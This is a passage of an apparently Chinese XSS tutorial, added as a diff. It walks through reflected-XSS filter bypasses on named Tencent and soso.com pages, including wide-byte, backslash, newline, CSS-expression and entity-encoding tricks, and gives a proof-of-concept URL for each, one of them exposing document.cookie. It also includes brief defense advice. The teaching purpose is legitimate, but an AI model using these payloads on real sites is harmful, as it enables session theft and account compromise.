+<p>缺陷源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;script type=&apos;text/javascript&apos;&gt;document.domain=&apos;soso.com&apos;;_ret=&#123;&quot;_res&quot;:2&#125;;try&#123;parent.aaa(_ret);&#125;catch(err)&#123;aaa(_ret);&#125;&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>碰到这种情况，首先判断，是否过滤了 <code>&lt;</code> , <code>&gt;</code> , <code>/</code> 等符号, 如果都没有过滤，一般可直接XSS。代码如下：  </p>
+<p><code>http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>   原理入下图：</p>
+<p>   <img src="2-1.webp" alt=""></p>
+<p>如果过滤了 <code>&lt;</code> , <code>&gt;</code> , <code>/</code> 等符号:</p>
+<ol>
+<li><code>http://activity.soso.com/common/setParentsInfo.php?callback=eval(&#39;alert(1)&#39;);void</code></li>
+</ol>
+<p><img src="2-2.webp" alt=""></p>
+</blockquote>
+<p><code>eval(&#39;alert(1)&#39;);</code>拼接到前面的<code>parent.</code>后面了，然后一个<code>;</code>结束了这个语句，然后<code>void</code>与后面拼接成了<code>void(_ret);</code>。即：</p>
+<blockquote>
+<p>我们插入的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】</p>
+<p>防御：</p>
+<ol>
+<li>过滤  组合  </li>
+<li>针对输出在不同的场景，进行合适的过滤。</li>
+</ol>
+</blockquote>
+<h2 id="3-输出在HTML属性里的情况"><a href="#3-输出在HTML属性里的情况" class="headerlink" title="3.输出在HTML属性里的情况"></a>3.输出在HTML属性里的情况</h2><p>反射型XSS，输出在HTML标签的属性中，比如引入CSS的style属性，或者标签的各种事件属性，不过前者已经过时，后者和输出在<code>&lt;script&gt;</code>标签中差不多。</p>
+<p>模型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;input value=&quot;输出&quot;&gt; </div><div class="line">&lt;img onload=&quot;...[输出]...&quot;&gt;</div><div class="line">&lt;body style=&quot;...[输出]...&quot;&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<ol>
+<li>大网站一般不是吃素的。前面讲到的基本情况，一般都很少遇到了。</li>
+<li>这个时候我们可以把目光发展一下，找一找在【输出】出现在HTML属性里的情况。</li>
+<li>最为典型的一种情况，是下面这样的。<br><code>http://xxxx.com/search.php?word=乌云欢迎您</code><br>HTML代码里则是下面这样情况的。<br><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; /&gt;</code><br>如果这里的word没过滤双引号。就会有以下的情况发生。<br><code>http://xxxx.com/search.php?word=乌云欢迎您&quot; onclick=&quot;alert(1)</code><br>对应的源代码如下：<br><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&quot; onclick=&quot;alert(1)&quot; /&gt;</code><br>那么当用户点击这个文本框时，就会触发 alert(1) 。<br>转义方法也挺简单，将 <code>&quot;</code> 转义为 <code>&amp;quot;</code> 就行。<br>转义后的代码如下：<br><code>&lt;input type=&quot;text&quot; value=&quot;乌云欢迎您&amp;quot; onclick=&amp;quot;alert(1)&quot; /&gt;</code>  </li>
+<li>一般, 过滤了 <code>&quot;</code> ，可以说是高枕无忧了，但是事实并非如此。某些情况下。我们依然可以继续XSS。  </li>
+</ol>
+</blockquote>
+<h3 id="第一种场景："><a href="#第一种场景：" class="headerlink" title="第一种场景："></a>第一种场景：</h3><p><code>&lt;body style=&quot;...[输出]...&quot;&gt;</code></p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;</div><div class="line">&gt;bg=我是一个兵,爱国爱人民&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,</div><div class="line">&gt;leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,</div><div class="line">&gt;luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>这里的bg参数过滤了【几乎】所有的东西。但是它输出在了 <code>&lt;body style=&quot;[这里]&quot;&gt;</code></p>
+<p><img src="3-0.webp" alt=""></p>
+<p>更重要的是，这里没有过滤 <code>\</code> ，反斜线， 而 css里，允许使用转义字符, <code>\+ascii16进制</code>形式  </p>
+<p>这里过滤了<code>expression</code>, 我们也可以轻松的用<code>expr\65ssion</code>绕过。</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&gt;http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;</div><div class="line">&gt;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61</div><div class="line">&gt;\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64</div><div class="line">&gt;\6f\77\2e\78\3d\31\7d\27\29\29</div><div class="line">&gt;&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,</div><div class="line">&gt;leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,</div><div class="line">&gt;luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><img src="3-1.webp" alt=""></p>
+<p>这种情况，遗憾之处在于，基于 css expression 的XSS 已经进入暮年了，只有在IE6，7 下方能触发，受众面小.</p>
+</blockquote>
+<h3 id="第二种场景"><a href="#第二种场景" class="headerlink" title="第二种场景"></a>第二种场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;HTML标签 onXXXX=&quot;...[输出在这里]..&quot;&gt;</div><div class="line">&lt;a href=&quot;javascript:[输出在这里]&quot;&gt;xxxx &lt;/a&gt;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>漏洞点：</p>
+<p><a href="http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa" target="_blank" rel="external">http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa</a></p>
+<p>看输出，如下，aaaaaaaa 出现在了2个点。</p>
+<p><img src="3-2.webp" alt=""></p>
+<p>常规来说，因为 <code>onxxxx=&quot;[输出]&quot;</code> 和 <code>href=&quot;javascript:[输出]&quot;</code> 与 <code>&lt;script&gt;[输出]&lt;/script&gt;</code> 没有太大区别。因为[输出]所在的地方，都是javascript脚本。<br>但是<code>&lt;script&gt;[输出]&lt;/script&gt;</code> 如果被过滤，往往没有太好的办法。<br>而上面这2种情况，则有一个很好的办法绕过过滤。  </p>
+<p>Tips:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">在HTML属性中，会自动对实体字符进行转义。一个简单的比方。</div><div class="line">   &lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</div><div class="line">   和</div><div class="line">   &lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#x28;1&amp;#x29;&quot;&gt; </div><div class="line">   是等效的</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>换言之，只要上面的情况，没有过滤 <code>&amp;</code>，<code>#</code>等符号，我们就可以写入任意字符。<br>看看缺陷点的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;li&gt;&lt;input type=&quot;text&quot; id=&quot;pagenum&quot;  class=&quot;inputstyle0814&quot;  onkeydown=&quot;</div><div class="line">if ((event.keyCode==13) &amp;&amp; (this.value!=&apos;&apos;)) </div><div class="line">	location.href=&apos;http://stock.finance.qq.com/report/search.php?offset=&apos;+this.value+&apos;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa&apos;</div><div class="line">&quot;/&gt;&lt;/li&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>JS部分我们可以做以下构造,由于<code>&#39;</code>被过滤，我们可以将<code>&#39;</code>写为 <code>&amp;#x27;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location.href=&apos;........&amp;searchvalue_yjbg=aaaaaa&apos;</div><div class="line">location.href=&apos;........&amp;searchvalue_yjbg=aaaaaa&apos;+alert(1)+&apos;&apos;</div><div class="line">location.href=&apos;........&amp;searchvalue_yjbg=aaaaaa&amp;#x27;+alert(1)+&amp;#x27;&apos;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>接着我们把代码转换为 url 的编码。 <code>&amp;-&gt; %26</code>, <code># -&gt; %23</code></p>
+<p>最后利用代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>用户点击页面[GO]按钮触发。</p>
+<p><img src="3-3.webp" alt=""></p>
+<p>由于缺陷点是发生在 onkeydown 或 a 标签的 href 属性中，无法自动触发，因而使得威胁减小，如果是发生在 img 的 onload 属性，则非常可能导致自动触发。  </p>
+<p>缺陷页面的 <code>&lt;a href=&quot;&quot;&gt;</code> 触发点的代码如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;li&gt;&lt;div class=&quot;yebg&quot;&gt;&lt;a href=&quot;javascript:</div><div class="line">&gt;location=&apos;http://stock.finance.qq.com/report/search.php?offset=&apos;+document.getElementById(&apos;pagenum&apos;).value+&apos;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa&apos;</div><div class="line">&gt;&quot;&gt;GO&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>防御：</p>
+<ol>
+<li>对于输出在HTML属性中的情况，需要特殊情况特殊对待，该过滤<code>\</code>的时候，请过滤<code>\</code>, 该过滤<code>&amp;</code>的情况，则过滤掉<code>&amp;</code></li>
+<li>碰到有某些修复的人用正则去判断， <code>&amp;#xNNN</code>.., 而实际上 <code>&amp;#x0NN;</code> <code>&amp;#x00NN</code>, （后面自己慢慢试。。） 都是可以的。 或者是 <code>&amp;#10进制;</code> 以及一些特殊的HTML实体，如 <code>&amp;quot;</code>等，都要注意到，好麻烦， 最好的办法，还是 <code>&amp;</code>过滤为 <code>&amp;amp;</code> ：）</li>
+</ol>
+</blockquote>
+<h2 id="4-宽字节复仇记-QQ邮箱基本通用"><a href="#4-宽字节复仇记-QQ邮箱基本通用" class="headerlink" title="4. 宽字节复仇记 [QQ邮箱基本通用]"></a>4. 宽字节复仇记 [QQ邮箱基本通用]</h2><p>反射型XSS，当<code>charset=gbxxxxx</code>时，可以尝试利用宽字节吃掉后面的转义</p>
+<blockquote>
+<p>漏洞点</p>
+<p><a href="http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa" target="_blank" rel="external">http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa</a></p>
+<p>尝试注入 <code>&quot;</code> 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了</p>
+<p><img src="4-0.webp" alt=""></p>
+<p>看到这种情况，一般人估计会放弃了吧，至少说明程序员注意到了这里，并且过滤了。<br>然后我们可以看到编码是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>gbxxxx系列的编码，那么我们尝试一下宽字节呢？</p>
+<p><a href="http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa" target="_blank" rel="external">http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</a></p>
+<p>看看效果：</p>
+<p><img src="4-1.webp" alt=""></p>
+<p>弹个窗:</p>
+<p><img src="4-2.webp" alt=""></p>
+<p><strong>至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。</strong></p>
+</blockquote>
+<h2 id="5-反斜线复仇记"><a href="#5-反斜线复仇记" class="headerlink" title="5. 反斜线复仇记"></a>5. 反斜线复仇记</h2><p>反射型XSS，输出点还是在<code>&lt;script&gt;</code>之间，有两个可控的输入输出点，可以在第一个输入输出点使用反斜线<code>\</code>转义后面的引号，第一个输出前的引号，与第二个输出前的引号，组成一个字符串，后面插入我们构造的代码。</p>
+<blockquote>
+<p>漏洞点：</p>
+<p><a href="http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1" target="_blank" rel="external">http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</a></p>
+<p>对应的输出：</p>
+<p><img src="5-0.webp" alt=""></p>
+<p>双引号被转义，反斜线还能用：</p>
+<p><img src="5-1.webp" alt=""></p>
+<p>把缺陷代码部分提取出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;script&gt;</div><div class="line">&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regalias=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;</div><div class="line">&gt;+&quot;&amp;ss=aaa&quot;</div><div class="line">&gt;+&quot;&amp;from=bbb&quot;</div><div class="line">&gt;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>有问题的地方ss和from，但不能使用双引号</p>
+<p>但是可以使用反斜线，杀掉<code>ss=aaa</code>后面的<code>&quot;</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><img src="5-2.webp" alt=""></p>
+<p>为了保证 bbb 后面的语法正确性，我们把bbb改为一个数字，把bbb后面加上 <code>//</code> 来注释掉后面的部分。变成以下形式。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=1//&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>但是,<code>&quot;字符串&quot;&amp;from=1</code>这样是错误的，因为&amp;符号的优先级高， <code>(&quot;字符串&quot;&amp;from)=1</code> 是无法进行这种赋值操作的</p>
+<p>使用<code>==</code>代替<code>=</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1//&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>由于<code>==</code>的优先级比 <code>&amp;</code> 高，所以语句相当于 <code>(&quot;字符串&quot;)&amp;(from==1)</code></p>
+<p>但是，from未定义，又会报错</p>
+<p>js有一个特性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;aaa();</div><div class="line">&gt;function aaa() &#123;</div><div class="line">&gt;	...</div><div class="line">&gt;&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说：</p>
+<p>解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;function aaa() &#123;</div><div class="line">&gt;	...</div><div class="line">&gt;&#125;</div><div class="line">&gt;aaa();</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>利用这样一个特性，我们的代码可以改改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>这样一来，我们的 <code>function from(){}</code> 就会被提前解析，从而定义了from, 后面 <code>from==1</code>的时候，就不会报错啦～～</p>
+<p>到了这一步，我们会发现还是不行。看一看源代码吧～～ ，哎，我们的空格被转义为了 <code>&amp;nbsp;</code> </p>
+<p><img src="5-3.webp" alt=""></p>
+<p>用注释符来做分隔符。 /**/替换空格，有没有觉得和 sql注入一样了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>这次没有语法错误了，我们插入我们自己的JS代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>最终完整poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from()&#123;&#125;;//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="6-换行符复仇记"><a href="#6-换行符复仇记" class="headerlink" title="6. 换行符复仇记"></a>6. 换行符复仇记</h2><p>反射型XSS，输出在<code>&lt;script&gt;</code>之间，且输出的那一行前面有单行注释，那么可以使用换行符，在代码中换行，新的一行前面没有注释，就能够执行我们构造的代码了。</p>
+<blockquote>
+<p>漏洞点</p>
+<p><a href="http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=aaaaaaaaaa" target="_blank" rel="external">http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=aaaaaaaaaa</a></p>
+<p>看输出点：</p>
+<p><img src="6-0.webp" alt=""></p>
+<p>输出点一共有5处，有在HTML标签之间的（教程1），也有在<code>&lt;script&gt;..&lt;/script&gt;</code>之间的。但是呢，该过滤的，<code>&lt;</code> , <code>&gt;</code> 过滤掉了， 该过滤的 <code>&quot;</code> ，也过滤掉了:</p>
+<p><img src="6-1.webp" alt=""></p>
+<p>输出点还有一处在注释里：</p>
+<p><img src="6-2.webp" alt=""></p>
+<p>这样一来，是否会想到这样一个用法呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;//我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>如果可以使用换行符的话，就会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;//我是注释，我爱洗澡，哦～哦～哦～ [我是输出  换行符</div><div class="line">&gt;alert(1);//我是输出]</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>这样alert(1); 就会被成功执行。</p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=%0aalert(1);//</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><img src="6-3.webp" alt=""></p>
+<p>成功弹窗</p>
+<p><img src="6-4.webp" alt=""></p>
+</blockquote>
+<h2 id="7-宽字节、反斜线与换行符一起复仇记"><a href="#7-宽字节、反斜线与换行符一起复仇记" class="headerlink" title="7. 宽字节、反斜线与换行符一起复仇记"></a>7. 宽字节、反斜线与换行符一起复仇记</h2><p>反射型XSS，宽字节、反斜线与换行符组合使用实现绕过</p>
+<blockquote>
+<p>漏洞点：</p>
+<p><a href="http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa" target="_blank" rel="external">http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa</a></p>
+<p>老规矩，继续看我们的输出。</p>
+<p><img src="7-0.webp" alt=""></p>
+<p>一共有3处输出，位于HTML属性里的那一处，我们放弃了，因为双引号被灭掉了。那么还剩下2处。 都是位于<code>&lt;script&gt;..&lt;/script&gt;</code>里，而且挨在了一起。</p>
+<p>先看第2处，是不是似曾相似啊？ 对的，教程6里刚刚遇到过。那就是输出在【注释】的情况。我们用换行符试试？</p>
+<p><img src="7-1.webp" alt=""></p>
+<p>一条是好消息，换行可以用，一条是坏消息。。下面出现的一句坏了我们的好事。。肿么办。</p>
+<p>js知识：</p>
+<p>javascript，字符串允许下面多行的写法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;var  a=&quot;我是一个字符串\</div><div class="line">&gt;我还是一个字符串&quot;;</div><div class="line">&gt;alert(a);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>基于这点，我们可以把缺陷点构造成下面的样子。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;//document.getElementById(&quot;order_select&quot;).value = &quot;aaaa\</div><div class="line">&gt;alert(1);//&quot;;</div><div class="line">&gt;	var searchOrder = &quot;aaaa\</div><div class="line">&gt;alert(1);//&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>那么代码构造的解析如下：</p>
+<p><img src="7-2.webp" alt=""></p>
+<p>带着这个想法，请上我们的反斜线。。</p>
+<p><img src="7-3.webp" alt=""></p>
+<p>悲剧的是，反斜线被过滤成了2个\，这下不好办了。</p>
+<p>还记得在教程4里，我们提到的宽字节用法么？说到了<code>%c0</code>可以吃掉<code>%5c</code>。我们看看页面的编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>于是，我们的<code>%c0</code>也加入战斗了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml</div><div class="line">&gt;&amp;orderby=aaaa%c0%5c%0aalert(1);//</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
